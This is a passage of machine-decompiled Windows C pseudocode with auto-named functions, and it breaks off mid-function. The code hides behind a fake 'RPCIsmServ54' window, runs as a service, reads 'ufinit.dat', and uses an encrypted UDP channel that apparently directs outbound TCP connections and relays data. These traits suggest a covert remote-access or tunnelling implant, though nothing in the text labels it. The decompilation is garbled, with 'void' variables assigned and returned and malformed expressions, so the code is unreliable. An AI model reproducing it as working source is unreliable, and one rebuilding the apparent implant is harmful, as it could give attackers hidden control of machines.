//----- (004034A0) --------------------------------------------------------
void  sub_4034A0( int a1)
{
	void result; 

	result = a1 - 1;
	if ( a1 == 1 )
	{
		ServiceStatus.dwControlsAccepted = 1;
		ServiceStatus.dwCurrentState = 1;
		ServiceStatus.dwWin32ExitCode = 0;
		ServiceStatus.dwWaitHint = 0;
		ServiceStatus.dwCheckPoint = 0;
		result = SetServiceStatus(hServiceStatus, &ServiceStatus);
	}
	return result;
}

//----- (00403630) --------------------------------------------------------
int  main(void hInstance, void hPrevInstance, char lpCmdLine, int nShowCmd)
{
	void v4; 
	char *v5; 
	char *v6; 
	const char *v7; 
	void v8; 
	int result; 
	void v10; 
	void v11; 
	int v12; 
	struct SERVICE_TABLE_ENTRYA ServiceStartTable; 
	int v14; 
	int v15; 
	struct tagMSG Msg; 

	v4 = FindWindowA("STATIC", "RPCIsmServ54");
	if ( v4 )
		return 0;
	hWnd = CreateWindowExA(
			(void)v4,
			"STATIC",
			"RPCIsmServ54",
			(void)v4,
			(int)v4,
			(int)v4,
			(int)v4,
			(int)v4,
			v4,
			v4,
			v4,
			v4);
	if ( &lpCmdLine  && (v5 = strstr(&lpCmdLine, "/s \""), v5) )
	{
		v7 = v5 + 4;
		v6 = strstr(&v5  + 4, "\"");
		if ( v6 )
		{
			strncpy(Dest, v7, v6 - v7);
			dword_40D434 = 1;
		}
	}
	else
	{
		dword_40D434 = 0;
		*&Dest[0] = dword_40B324;
		dword_40D314 = dword_40B328;
		word_40D318 = word_40B32C;
	}
	ServiceStartTable.lpServiceName = Dest;
	ServiceStartTable.lpServiceProc = (void)sub_4034E0;
	v14 = 0;
	v15 = 0;
	nullsub_1();
	if ( dword_40D434 )
	{
		StartServiceCtrlDispatcherA(&ServiceStartTable);
		return 0;
	}
	v10 = sub_405FC0(v8);
	hThread = v10;
	if ( v10 )
	{
		nullsub_1();
		v12 = (int)sub_403460(v11);
		dword_40D300 = v12;
		if ( v12 )
		{
			nullsub_1();
			if ( !GetMessageA(&Msg, hWnd, 0, 0) )
				return 0;
			do
			{
				if ( Msg.message == 1326 )
					ExitProcess(0);
				result = GetMessageA(&Msg, hWnd, 0, 0);
			}
			while ( result );
		}
		else
		{
			nullsub_1();
			TerminateThread(hThread, 0);
			result = 0;
		}
	}
	else
	{
		nullsub_1();
		result = 0;
	}
	return result;
}

//----- (00403800) --------------------------------------------------------
int  sub_403800(int a1)
{
	int v2; 

	v2 = a1;
	sub_401390(a1 + 24);
	sub_401390(v2 + 44);
	return v2;
}

//----- (00403850) --------------------------------------------------------
int  sub_403850()
{
	filebuf___filebuf();
	return filebuf___filebuf();
}

//----- (004038A0) --------------------------------------------------------
void  sub_4038A0(void a1)
{
	void result; 

	result = a1;
	dword_40D43C = a1;
	return result;
}

//----- (004038B0) --------------------------------------------------------
void  sub_4038B0(int a1)
{
	int v1; 
	void v2; 
	int v3; 
	void result; 
	int v5; 
	void v6; 
	void v7; 
	void v8; 

	v1 =  new(0x104u);
	v3 = a1;
	v2 = v1;
	if ( v1 )
	{
		v5 = recv(*(&a1  + 12), (char *)v1, 256, 0);
		if ( v5 )
		{
			if ( v5 == -1 )
			{
				j__free((void *)v2);
				closesocket(*(&v3  + 12));
				v8 = *(v3 + 8);
				*(v3 + 12) = -1;
				result = PostThreadMessageA(dword_40D43C, 0x401u, v8, 21);
			}
			else
			{
				*(v2 + 256) = v5;
				result = PostThreadMessageA(dword_40D43C, 0x406u, *(v3 + 8), v2);
			}
		}
		else
		{
			j__free((void *)v2);
			closesocket(*(&v3  + 12));
			v7 = *(v3 + 8);
			*(v3 + 12) = -1;
			result = PostThreadMessageA(dword_40D43C, 0x401u, v7, 20);
		}
	}
	else
	{
		closesocket(*(&a1  + 12));
		v6 = *(v3 + 8);
		*(v3 + 12) = -1;
		result = PostThreadMessageA(dword_40D43C, 0x401u, v6, 8);
	}
	return result;
}

//----- (004039A0) --------------------------------------------------------
int  sub_4039A0(int a1)
{
	int result; 
	int v2; 
	char * v3; 
	void v4; 
	struct timeval timeout; 
	int readfds; 

	v2 = a1;
	v3 = *(a1 + 12);
	timeout.tv_sec = 0;
	timeout.tv_usec = 100;
	readfds.fd_array[0] = v3;
	readfds.fd_count = 1;
	result = select(0, &readfds, 0, 0, &timeout);
	if ( result )
	{
		if ( result != -1 && result == 1 )
		{
			result = sub_4038B0(v2);
		}
		else
		{
			closesocket(*(&v2  + 12));
			v4 = *(v2 + 8);
			*(v2 + 12) = -1;
			result = PostThreadMessageA(dword_40D43C, 0x401u, v4, 16);
		}
	}
	return result;
}

//----- (00403A40) --------------------------------------------------------
void  sub_403A40(int a1)
{
	void result; 
	int v2; 
	void v3; 
	struct tagMSG Msg; 

	result = PeekMessageA(&Msg, 0, 0, 0, 1u);
	if ( result )
	{
		v2 = a1;
		do
		{
			if ( Msg.message == 1027 )
			{
				if ( *(v2 + 12) != -1 )
				{
					if ( send(*(&v2  + 12), *(const char **)(Msg.wParam + 16), *(Msg.wParam + 12), 0) != *(Msg.wParam + 12) )
					{
						closesocket(*(&v2  + 12));
						v3 = *(v2 + 8);
						*(v2 + 12) = -1;
						PostThreadMessageA(dword_40D43C, 0x401u, v3, 19);
					}
				}
				sub_403E60((void *)Msg.wParam);
			}
			else
			{
				if ( Msg.message == 1028 )
				{
					closesocket(*(&v2  + 12));
					*(v2 + 12) = -1;
				}
			}
			result = PeekMessageA(&Msg, 0, 0, 0, 1u);
		}
		while ( result );
	}
	return result;
}

//----- (00403B00) --------------------------------------------------------
int  sub_403B00(void a1)
{
	int v1; 
	int v2; 

	v1 = socket(2, 1, 0);
	v2 = (int)a1;
	*(a1 + 3) = v1;
	if ( v1 == -1 )
		goto LABEL_4;
	if ( connect(&v1 , (const struct sockaddr *)a1 + 4, 16) )
	{
		closesocket(*(&v2  + 12));
		*(v2 + 12) = -1;
LABEL_4:
		PostThreadMessageA(dword_40D43C, 0x401u, *(v2 + 8), 15);
		PostThreadMessageA(dword_40D43C, 0x405u, *(v2 + 8), 0);
		return 0;
	}
	PostThreadMessageA(dword_40D43C, 0x402u, *(v2 + 8), 15);
	do
	{
		if ( sub_404530(*(char *)(v2 + 4)) )
			Sleep(0x14u);
		else
			sub_4039A0(v2);
		sub_403A40(v2);
	}
	while ( *(v2 + 12) != -1 );
	PostThreadMessageA(dword_40D43C, 0x405u, *(v2 + 8), 0);
	return 0;
}

//----- (00403BE0) --------------------------------------------------------
int  sub_403BE0(int a1, int a2, int a3)
{
	int v3; 
	int v4; 
	int result; 
	int v6; 
	int v7; 
	int v8; 
	void v9; 
	int v10; 
	int v11; 

	v3 =  new(0x50u);
	v10 = v3;
	v11 = 0;
	if ( v3 )
		v4 = sub_403800(v3);
	else
		v4 = 0;
	v11 = -1;
	if ( v4 )
	{
		v6 = a1;
		*(v4 + 64) = *a1;
		*(v4 + 68) = *(v6 + 4);
		*(v4 + 72) = *(v6 + 8);
		*(v4 + 76) = *(v6 + 12);
		v7 = a2;
		v8 = HIvoid(a2);
		*(char *)(v4 + 4) = a2;
		*(v4 + 8) = v7;
		*(char *)(v4 + 6) = v8;
		*(v4 + 12) = -1;
		v9 = CreateThread(0, 0, (void ( *)(void))sub_403B00, (void)v4, 0, (void)(v4 + 16));
		*(v4 + 20) = v9;
		if ( v9 )
		{
			result = v4;
		}
		else
		{
			*a3 = 14;
			sub_403850();
			j__free((void *)v4);
			result = 0;
		}
	}
	else
	{
		*a3 = 8;
		result = 0;
	}
	return result;
}

//----- (00403CE0) --------------------------------------------------------
void  sub_403CE0(void a1)
{
	void result; 

	result = a1;
	dword_40D440 = a1;
	return result;
}

//----- (00403CF0) --------------------------------------------------------
int  sub_403CF0(void a1)
{
	void v1; 
	void *v2; 
	int result; 
	void v4; 
	void NumberOfBytesRead; 

	NumberOfBytesRead = a1;
	v1 = CreateFileA("ufinit.dat", 1u, 1u, 0, 3u, 0x80u, 0);
	v2 = v1;
	if ( v1 )
	{
		v4 = ReadFile(&v1 , &byte_40D450, 0xAu, &NumberOfBytesRead, 0);
		CloseHandle(&v2 );
		if ( v4 )
			result = ((NumberOfBytesRead == 10) - 1) & 0xFFFFFFFD;
		else
			result = -2;
	}
	else
	{
		result = -1;
	}
	return result;
}

//----- (00403D70) --------------------------------------------------------
char *  sub_403D70()
{
	char * result; 
	struct sockaddr name; 

	result = socket(2, 2, 0);
	s = result;
	if ( result != -1 )
	{
		name.sa_family = 2;
		*&name.sa_data[2] = 0;
		*(char *)&name.sa_data[0] = htons(hostshort);
		result = -(bind(s, &name, 16) != 0) & 0xFFFFFFFE;
	}
	return result;
}

//----- (00403DD0) --------------------------------------------------------
int  sub_403DD0(int a1, int a2)
{
	int v2; 
	int v3; 
	int result; 
	int v5; 

	v3 = a1;
	(a1) = *(char *)(a1 + 100);
	v5 = *(a2 + 16);
	HIvoid(a1) = *(char *)(a2 + 2);
	v2 = sub_403BE0(v5, a1, (int)&a1);
	if ( v2 )
	{
		sub_401040(v3 + 48, v2);
		result = 0;
	}
	else
	{
		result = a1;
	}
	return result;
}

//----- (00403E20) --------------------------------------------------------
int  sub_403E20(int a1, int a2)
{
	int v2; 
	int result; 

	v2 = *(a1 + 76);
	if ( v2 )
	{
		while ( *(char *)(*(v2 + 8) + 4) != *(char *)(a2 + 4) )
		{
			v2 = *v2;
			if ( !v2 )
				goto LABEL_4;
		}
		result = 0;
	}
	else
	{
LABEL_4:
		result = (-(sub_401040(a1 + 72, a2) != 0) & 0xFFFFFFFC) + 4;
	}
	return result;
}

//----- (00403E60) --------------------------------------------------------
void  sub_403E60(void *Memory)
{
	void *v1; 

	v1 = Memory;
	if ( Memory )
	{
		if ( *(Memory + 3) )
		{
			if ( *(Memory + 4) )
				free(*((void **)Memory + 4));
		}
		j__free(v1);
	}
}

//----- (00403E90) --------------------------------------------------------
int  sub_403E90(int a1, unsigned int a2, int a3)
{
	int v3; 
	void v5; 
	int v6; 
	int v7; 
	void *v8; 
	char v9; 

	v3 = a2;
	if ( a2 < 9 )
		return -1;
	v6 = a1;
	v7 = a3;
	*(char *)a3 = *(char *)a1;
	*(char *)(a3 + 2) = *(char *)(v6 + 2);
	*(char *)(a3 + 4) = *(char *)(v6 + 4);
	*(char *)(a3 + 6) = *(char *)(v6 + 6);
	v9 = v3 == 9;
	v5 = v3 - 9;
	*(a3 + 8) = *(char *)(v6 + 8);
	*(a3 + 12) = v5;
	if ( !v9 )
	{
		v8 = malloc(v5);
		*(v7 + 16) = v8;
		if ( !v8 )
			return -2;
		memcpy(&v8 , (const void *)(v6 + 9), *(v7 + 12));
	}
	return 0;
}

//----- (00403F10) --------------------------------------------------------
int  sub_403F10(int a1)
{
	void *v1; 
	int result; 

	v1 = dword_40D46C;
	if ( dword_40D46C )
	{
		while ( *(char *)(*(v1 + 2) + 100) != a1 )
		{
			v1 = *(void **)v1;
			if ( !v1 )
				goto LABEL_4;
		}
		result = *(v1 + 2);
	}
	else
	{
LABEL_4:
		result = 0;
	}
	return result;
}

//----- (00403F40) --------------------------------------------------------
int  sub_403F40(int a1, int a2)
{
	void *v2; 
	int v3; 
	int result; 
	unsigned int v5; 

	if ( lpBuffer )
		free((void *)lpBuffer);
	v3 = a2;
	v2 = malloc(*(a2 + 12));
	lpBuffer = v2;
	if ( v2 )
	{
		memcpy(&v2 , *(const void **)(v3 + 16), *(v3 + 12));
		v5 = *(v3 + 12);
		Size = v5;
		result = sub_401460(0, lpBuffer, v5);
	}
	else
	{
		result = 9;
	}
	return result;
}

//----- (00403FB0) --------------------------------------------------------
int  sub_403FB0(int a1)
{
	int v2; 

	v2 = a1;
	sub_401390(a1 + 4);
	sub_401390(v2 + 24);
	return v2;
}

//----- (00404000) --------------------------------------------------------
int  sub_404000()
{
	filebuf___filebuf();
	return filebuf___filebuf();
}

//----- (00404050) --------------------------------------------------------
int  sub_404050(int a1, int a2)
{
	int v2; 
	int v3; 
	int v4; 
	void **v5; 

	v2 = **(void **)(a2 + 16);
	v3 = a1;
	v4 = *(a1 + 64);
	if ( v4 )
	{
		while ( 1 )
		{
			v5 = *(void ***)(v4 + 8);
			if ( *((char *)*v5 + 2) == *(char *)(a2 + 4) )
				break;
			v4 = *v4;
			if ( !v4 )
				return -1;
		}
		if ( v2 == 1 )
		{
			*(v5 + 4) = (void *)v2;
			return -1;
		}
		free(*v5);
		j__free(v5);
		sub_4010A0(v3 + 60, (void *)v4);
	}
	return -1;
}

//----- (004040C0) --------------------------------------------------------
int  sub_4040C0(int a1)
{
	int v2; 

	v2 = a1;
	sub_401000(a1 + 48);
	sub_401000(v2 + 60);
	sub_401000(v2 + 72);
	sub_401000(v2 + 84);
	return v2;
}

//----- (00404130) --------------------------------------------------------
int  sub_404130(int a1, const void *a2, void a3, int a4, int a5, int a6)
{
	int v6; 
	unsigned int v7; 
	int result; 
	int v9; 
	int v10; 
	void *v11; 
	void v12; 
	void dwBufLen; 
	void v14; 

	v6 = a1;
	v7 = a3;
	dwBufLen = a3;
	if ( a3 && a6 && !CryptEncrypt(*(a1 + 12), 0, 1, 0, 0, &dwBufLen, 0) )
		return 12;
	v9 =  new(0x14u);
	v10 = v9;
	if ( !v9 )
		return 8;
	*(v9 + 16) = 0;
	*(v9 + 4) = dwBufLen;
	v11 = malloc(dwBufLen + 9);
	*v10 = v11;
	if ( !v11 )
	{
		j__free((void *)v10);
		return 8;
	}
	*(char *)v11 = *(char *)(v6 + 100);
	*(char *)(*v10 + 2) = a5;
	*(char *)(*v10 + 4) = *(char *)(v6 + 96)++;
	*(char *)(*v10 + 6) = a4;
	*(*v10 + 8) = a6 != 0;
	if ( v7
			&& (v12 = a3, memcpy((void *)(*&v10  + 9), a2, v7), v14 = v12, a6)
			&& !CryptEncrypt(*(v6 + 12), 0, 1, 0, (char *)(*v10 + 9), &v14, dwBufLen) )
	{
		free(*(void **)v10);
		j__free((void *)v10);
		result = 12;
	}
	else
	{
		*(v10 + 4) = dwBufLen + 9;
		*(v10 + 12) = 0;
		*(v10 + 8) = GetTickCount();
		if ( sub_401040(v6 + 60, v10) )
		{
			if ( sendto(&s, *(const char **)v10, *(v10 + 4), 0, (const struct sockaddr *)(v6 + 16), 16) == *(v10 + 4) )
			{
				*(v6 + 108) = GetTickCount();
				result = 0;
			}
			else
			{
				WSAGetLastError();
				result = 13;
			}
		}
		else
		{
			free(*(void **)v10);
			j__free((void *)v10);
			result = 4;
		}
	}
	return result;
}

//----- (00404300) --------------------------------------------------------
int  sub_404300(int a1)
{
	int v2; 

	v2 = a1;
	sub_401380(a1 + 84);
	sub_401380(v2 + 72);
	sub_401380(v2 + 60);
	return sub_401380(v2 + 48);
}

//----- (00404370) --------------------------------------------------------
int  sub_404370(int a1, int a2)
{
	int v2; 
	int v4; 
	int v5; 

	v4 = a2;
	v2 = a1;
	*(a1 + 112) = 1;
	v5 = *(v4 + 16);
	*(a1 + 32) = *v5;
	*(a1 + 36) = *(v5 + 4);
	*(a1 + 40) = *(v5 + 8);
	*(a1 + 44) = *(v5 + 12);
	while ( *(v2 + 64) )
	{
		free(**(void ***)(*(v2 + 64) + 8));
		j__free(*(void **)(*(v2 + 64) + 8));
		sub_4010A0(v2 + 60, *(void **)(v2 + 64));
	}
	return 0;
}

//----- (004043E0) --------------------------------------------------------
int  sub_4043E0(struct sockaddr *to, int a2, int a3)
{
	int result; 
	int v4; 
	int v5; 
	int v6; 
	int buf; 
	int v8; 
	int v9; 
	int v10; 
	char v11; 

	v4 = *(char *)a2;
	v5 = *(char *)(a2 + 4);
	v6 = *(char *)(a2 + 2);
	buf = v4;
	v8 = v5;
	v9 = a3;
	v10 = 12;
	v11 = 0;
	if ( sendto(&s, (const char *)&buf, 13, 0, to, 16) == 13 )
	{
		result = 0;
	}
	else
	{
		WSAGetLastError();
		result = 13;
	}
	return result;
}

//----- (00404450) --------------------------------------------------------
int  sub_404450(int a1, void pdwDataLen)
{
	void v2; 
	int result; 
	char *v4; 

	v2 = pdwDataLen;
	v4 = *(char **)(pdwDataLen + 16);
	pdwDataLen = *(pdwDataLen + 12);
	if ( CryptDecrypt(*(a1 + 8), 0, 1, 0, v4, &pdwDataLen) )
	{
		*(v2 + 12) = pdwDataLen;
		*(v2 + 8) = 0;
		result = 0;
	}
	else
	{
		GetLastError();
		result = 3;
	}
	return result;
}

//----- (004044A0) --------------------------------------------------------
int  sub_4044A0(int a1, int a2)
{
	return (-(CryptImportKey(hProv, *(const char **)(a2 + 16), *(a2 + 12), 0, 0, (void *)(a1 + 12)) != 0) & 0xFFFFFFF9)
		+ 7;
}

//----- (004044D0) --------------------------------------------------------
int  sub_4044D0(int a1, int a2)
{
	int v2; 
	int result; 
	int v4; 

	v2 = *(a1 + 52);
	if ( !v2 )
		goto LABEL_10;
	while ( *(char *)(*(v2 + 8) + 6) != *(char *)(a2 + 2) )
	{
		v2 = *v2;
		if ( !v2 )
			return 17;
	}
	v4 = *(v2 + 8);
	if ( v4 )
		result = (-(PostThreadMessageA(*(v4 + 16), 0x404u, 0, 0) != 0) & 0xFFFFFFEE) + 18;
	else
		LABEL_10:
			result = 17;
	return result;
}

//----- (00404530) --------------------------------------------------------
void  sub_404530(int a1)
{
	void *v1; 
	void result; 
	int v3; 

	v1 = dword_40D46C;
	if ( !dword_40D46C )
		goto LABEL_10;
	while ( *(char *)(*(v1 + 2) + 100) != a1 )
	{
		v1 = *(void **)v1;
		if ( !v1 )
			return 1;
	}
	v3 = *(v1 + 2);
	if ( v3 )
		result = (unsigned int)sub_401020(v3 + 60) >= 3;
	else
		LABEL_10:
			result = 1;
	return result;
}

//----- (00404580) --------------------------------------------------------
int  sub_404580(void pdwDataLen)
{
	void *v1; 
	int v2; 
	int v3; 
	int result; 
	int v5; 
	int v6; 
	int v7; 

	v1 = dword_40D46C;
	v2 = pdwDataLen;
	if ( !dword_40D46C )
	{
LABEL_4:
		v3 = 0;
		goto LABEL_6;
	}
	while ( *(char *)(*(v1 + 2) + 100) != *(char *)pdwDataLen )
	{
		v1 = *(void **)v1;
		if ( !v1 )
			goto LABEL_4;
	}
	v3 = *(v1 + 2);
	if ( !v3 )
	{
LABEL_6:
		if ( *(char *)(pdwDataLen + 6) != 1 || *(pdwDataLen + 8) )
			return 2;
		goto LABEL_13;
	}
	if ( *(pdwDataLen + 8) )
	{
		if ( sub_404450(v3, pdwDataLen) )
			return 3;
		*(v2 + 8) = 0;
	}
LABEL_13:
	v5 = *(char *)(v2 + 6);
	if ( v5 == 12 || v5 == 1 )
	{
		result = 0;
	}
	else
	{
		*(v3 + 108) = GetTickCount();
		v6 = *(char *)(v2 + 4);
		v7 = *(char *)(v3 + 98);
		if ( (char)v6 == (char)v7 || (unsigned int)(v6 - v7) >= word_40D454 )
		{
			result = (((char)v6 == (char)v7) - 1) & 5;
		}
		else
		{
			result = sub_403E20(v3, v2);
			if ( !result )
				result = 1;
		}
	}
	return result;
}

//----- (00404650) --------------------------------------------------------
int  sub_404650(int a1)
{
	int result; 
	int v2; 
	int v3; 
	int v4; 
	void *v5; 
	void v6; 
	char *v7; 
	void v8; 
	int Buffer; 
	void dwBufLen; 
	int v11; 

	result = sub_401660(&Buffer);
	if ( !result )
	{
		v2 = a1;
		v6 = *(a1 + 12);
		dwBufLen = 4;
		if ( !CryptEncrypt(v6, result, 1, result, (char *)result, &dwBufLen, result) )
			return 12;
		v3 =  new(0x14u);
		v4 = v3;
		if ( !v3 )
			return 8;
		*(v3 + 16) = 0;
		*(v3 + 4) = dwBufLen;
		v5 = malloc(dwBufLen + 9);
		*v4 = v5;
		if ( !v5 )
		{
			j__free((void *)v4);
			return 8;
		}
		*(char *)v5 = *(char *)(v2 + 100);
		*(char *)(*v4 + 2) = 0;
		*(char *)(*v4 + 4) = *(char *)(v2 + 96)++;
		*(char *)(*v4 + 6) = 20;
		*(*v4 + 8) = 1;
		*(*v4 + 9) = Buffer;
		v7 = (char *)(*v4 + 9);
		v8 = *(v2 + 12);
		v11 = 4;
		if ( CryptEncrypt(v8, 0, 1, 0, v7, (void *)&v11, dwBufLen) )
		{
			*(v4 + 4) = dwBufLen + 9;
			*(v4 + 12) = 0;
			*(v4 + 8) = GetTickCount();
			if ( sub_401040(v2 + 60, v4) )
			{
				if ( sendto(&s, *(const char **)v4, *(v4 + 4), 0, (const struct sockaddr *)(v2 + 16), 16) == *(v4 + 4) )
				{
					*(v2 + 108) = GetTickCount();
					result = 0;
				}
				else
				{
					WSAGetLastError();
					result = 13;
				}
			}
			else
			{
				free(*(void **)v4);
				j__free((void *)v4);
				result = 4;
			}
		}
		else
		{
			free(*(void **)v4);
			j__free((void *)v4);
			result = 12;
		}
	}
	return result;
}

//----- (004047F0) --------------------------------------------------------
int  sub_4047F0(int a1, signed int a2)
{
	int v2; 
	int v3; 
	unsigned int v4; 
	void v5; 
	int v6; 
	int v7; 
	void *v8; 
	int result; 
	void *v10; 
	int v11; 
	void v12; 
	void v13; 
	void v14; 
	void dwBufLen; 
	void v16; 

	v11 = sub_4016F0(*(void *)(a2 + 16));
	v5 = lpBuffer;
	v2 = a1;
	v3 = v11;
	v4 = Size;
	a2 = v11;
	v14 = Size;
	dwBufLen = Size;
	if ( Size && !CryptEncrypt(*(a1 + 12), 0, 1, 0, 0, &dwBufLen, 0) )
	{
		result = v3;
	}
	else
	{
		v6 =  new(0x14u);
		v7 = v6;
		if ( !v6 )
			return a2;
		*(v6 + 16) = 0;
		*(v6 + 4) = dwBufLen;
		v8 = malloc(dwBufLen + 9);
		*v7 = v8;
		if ( !v8 )
		{
			j__free((void *)v7);
			return a2;
		}
		*(char *)v8 = *(char *)(v2 + 100);
		*(char *)(*v7 + 2) = 0;
		*(char *)(*v7 + 4) = *(char *)(v2 + 96)++;
		*(char *)(*v7 + 6) = 24;
		*(*v7 + 8) = 1;
		if ( v4 )
		{
			v12 = v14;
			memcpy((void *)(*&v7  + 9), v5, v4);
			v13 = *(v2 + 12);
			v16 = v12;
			if ( !CryptEncrypt(v13, 0, 1, 0, (char *)(*v7 + 9), (void *)&v16, dwBufLen) )
			{
				v10 = *(void **)v7;
LABEL_9:
				free(v10);
				j__free((void *)v7);
				return a2;
			}
		}
		*(v7 + 4) = dwBufLen + 9;
		*(v7 + 12) = 0;
		*(v7 + 8) = GetTickCount();
		if ( !sub_401040(v2 + 60, v7) )
		{
			v10 = *(void **)v7;
			goto LABEL_9;
		}
		if ( sendto(&s, *(const char **)v7, *(v7 + 4), 0, (const struct sockaddr *)(v2 + 16), 16) == *(v7 + 4) )
		{
			*(v2 + 108) = GetTickCount();
			result = a2;
		}
		else
		{
			WSAGetLastError();
			result = a2;
		}
	}
	return result;
}

//----- (004049B0) --------------------------------------------------------
void * sub_4049B0()
{
	void *result; 
	void *v12; 
	int v13; 
	void *v14; 
	int v15; 
	void *v16; 
	int v17; 
	unsigned int v18; 
	int v19; 
	int v20; 
	int v21; 
	void *v22; 
	int v23; 
	int v24; 
	char v25; 
	int v26; 
	void v27; 
	char v28; 
	void *v29; 
	void *Memory; 
	int v31; 
	char v32; 
	int v33; 
	int v34; 
	char v35; 
	void dwBufLen; 
	int v37; 

	result = dword_40D46C;
	v29 = dword_40D46C;
	if ( dword_40D46C )
	{
		do
		{
			v14 = v29;
			v12 = dword_40D46C;
			v13 = *(v29 + 2);
			if ( dword_40D46C )
			{
				while ( *(char *)(*(v12 + 2) + 100) != *(char *)(v13 + 100) )
				{
					v12 = *(void **)v12;
					if ( !v12 )
						goto LABEL_33;
				}
				v15 = *(v12 + 2);
				if ( v15 )
				{
					if ( (unsigned int)sub_401020(v15 + 60) < 3 )
					{
						v16 = *(void **)(v13 + 88);
						Memory = *(void **)(v13 + 88);
						if ( v16 )
						{
							while ( 1 )
							{
								v17 = *(v16 + 2);
								v23 = *(v17 + 48);
								v31 = *(v16 + 2);
								if ( !v23 )
									goto LABEL_36;
								v18 = *(v17 + 36) - *(v17 + 44);
								if ( v18 > 0xFA )
									v18 = 250;
								memcpy(&v32, (const void *)(*(v17 + 44) + *(v17 + 40)), v18);
								v19 = v18 + 3;
								v24 = *(v17 + 44) + v18;
								v33 = *(char *)v17;
								v25 = v24 != *(v17 + 36);
								v34 = v19;
								*(v17 + 44) = v24;
								v35 = v25;
								dwBufLen = v19;
								if ( !v19 || CryptEncrypt(*(v13 + 12), 0, 1, 0, 0, &dwBufLen, 0) )
								{
									v20 =  new(0x14u);
									v21 = v20;
									if ( v20 )
									{
										*(v20 + 16) = 0;
										*(v20 + 4) = dwBufLen;
										v22 = malloc(dwBufLen + 9);
										*v21 = v22;
										if ( v22 )
										{
											*(char *)v22 = *(char *)(v13 + 100);
											*(char *)(*v21 + 2) = 0;
											*(char *)(*v21 + 4) = *(char *)(v13 + 96)++;
											*(char *)(*v21 + 6) = 30;
											*(*v21 + 8) = 1;
											if ( !v19
													|| (v26 = v34, memcpy((void *)(*&v21  + 9), &v35, v19), v27 = *(v13 + 12), v37 = v26, CryptEncrypt(v27, 0, 1, 0, (char *)(*v21 + 9), (void *)&v37, dwBufLen)) )
											{
												*(v21 + 4) = dwBufLen + 9;
												*(v21 + 12) = 0;
												*(v21 + 8) = GetTickCount();
												if ( sub_401040(v13 + 60, v21) )
												{
													if ( sendto(
																s,
																*(const char **)v21,
																*(v21 + 4),
																0,
																(const struct sockaddr *)(v13 + 16),
																16) == *(v21 + 4) )
														*(v13 + 108) = GetTickCount();
													else
														WSAGetLastError();
												}
												else
												{
													free(*(void **)v21);
													j__free((void *)v21);
												}
											}
											else
											{
												free(*(void **)v21);
												j__free((void *)v21);
											}
										}
										else
										{
											j__free((void *)v21);
										}
									}
									v17 = v31;
								}
								v16 = Memory;
								if ( *(v17 + 44) != *(v17 + 36) )
								{
LABEL_36:
									Memory = *(void **)v16;
								}
								else
								{
									Memory = *(void **)Memory;
									sub_4010A0(v13 + 84, v16);
									sub_401230(v17 + 4);
									sub_401230(v17 + 24);
									sub_404000();
									j__free((void *)v17);
								}
								if ( !Memory )
									break;
								v16 = Memory;
							}
							v14 = v29;
						}
					}
				}
			}
LABEL_33:
			result = *(void **)v14;
			v28 = *v14 == 0;
			v29 = *(void **)v14;
		}
		while ( !v28 );
	}
	return result;
}

//----- (00404C70) --------------------------------------------------------
int  sub_404C70(int a1, int a2)
{
	void *v2; 
	int v4; 
	unsigned int v5; 
	const void *v6; 
	int v7; 
	int v8; 
	int v9; 
	void *v10; 
	int v11; 
	void v12; 
	int v13; 
	int v14; 
	void dwBufLen; 
	int v16; 

	v2 = dword_40D46C;
	if ( !dword_40D46C )
		return 22;
	while ( *(char *)(*(v2 + 2) + 100) != a2 )
	{
		v2 = *(void **)v2;
		if ( !v2 )
			return 22;
	}
	v4 = *(v2 + 2);
	if ( !v4 )
		return 22;
	v6 = *(const void **)(a1 + 16);
	v5 = *(a1 + 12);
	v14 = *(a1 + 12);
	dwBufLen = v5;
	if ( !v5 || CryptEncrypt(*(v4 + 12), 0, 1, 0, 0, &dwBufLen, 0) )
	{
		v8 =  new(0x14u);
		v9 = v8;
		if ( v8 )
		{
			*(v8 + 16) = 0;
			*(v8 + 4) = dwBufLen;
			v10 = malloc(dwBufLen + 9);
			*v9 = v10;
			if ( v10 )
			{
				*(char *)v10 = *(char *)(v4 + 100);
				*(char *)(*v9 + 2) = 0;
				*(char *)(*v9 + 4) = *(char *)(v4 + 96)++;
				*(char *)(*v9 + 6) = 31;
				*(*v9 + 8) = 1;
				if ( !v5
						|| (v11 = v14, memcpy((void *)(*&v9  + 9), v6, v5), v12 = *(v4 + 12), v16 = v11, CryptEncrypt(v12, 0, 1, 0, (char *)(*v9 + 9), (void *)&v16, dwBufLen)) )
				{
					*(v9 + 4) = dwBufLen + 9;
					*(v9 + 12) = 0;
					*(v9 + 8) = GetTickCount();
					if ( sub_401040(v4 + 60, v9) )
					{
						if ( sendto(&s, *(const char **)v9, *(v9 + 4), 0, (const struct sockaddr *)(v4 + 16), 16) == *(v9 + 4) )
						{
							*(v4 + 108) = GetTickCount();
							v7 = 0;
						}
						else
						{
							WSAGetLastError();
							v7 = 13;
						}
					}
					else
					{
						free(*(void **)v9);
						j__free((void *)v9);
						v7 = 4;
					}
				}
				else
				{
					free(*(void **)v9);
					j__free((void *)v9);
					v7 = 12;
				}
				goto LABEL_22;
			}
			j__free((void *)v9);
		}
		v7 = 8;
	}
	else
	{
		v7 = 12;
	}
LABEL_22:
	v13 = a1;
	sub_401230(a1);
	(**(int ( ***)(void, void))v13)(v13, 1);
	return v7;
}

//----- (00404E60) --------------------------------------------------------
int  sub_404E60(int a1, char a2)
{
	void *v2; 
	int result; 
	int v4; 
	int v5; 

	v2 = dword_40D46C;
	if ( !dword_40D46C )
		goto LABEL_16;
	while ( *(char *)(*(v2 + 2) + 100) != (char)a1 )
	{
		v2 = *(void **)v2;
		if ( !v2 )
			return 22;
	}
	v4 = *(v2 + 2);
	if ( v4 )
	{
		v5 = *(v4 + 52);
		if ( !v5 )
			goto LABEL_17;
		while ( *(char *)(*(v5 + 8) + 6) != HIvoid(a1) )
		{
			v5 = *v5;
			if ( !v5 )
				return 23;
		}
		if ( *(v5 + 8) )
			result = sub_404130(v4, &a2, 4u, 6, SHIvoid(a1), 0);
		else
			LABEL_17:
				result = 23;
	}
	else
	{
LABEL_16:
		result = 22;
	}
	return result;
}

//----- (00404EE0) --------------------------------------------------------
int  sub_404EE0(int a1)
{
	void *v1; 
	int result; 
	int v3; 
	int v4; 
	int v5; 

	v1 = dword_40D46C;
	if ( !dword_40D46C )
		goto LABEL_16;
	while ( *(char *)(*(v1 + 2) + 100) != (char)a1 )
	{
		v1 = *(void **)v1;
		if ( !v1 )
			return 22;
	}
	v3 = *(v1 + 2);
	if ( v3 )
	{
		v4 = *(v3 + 52);
		if ( !v4 )
			goto LABEL_17;
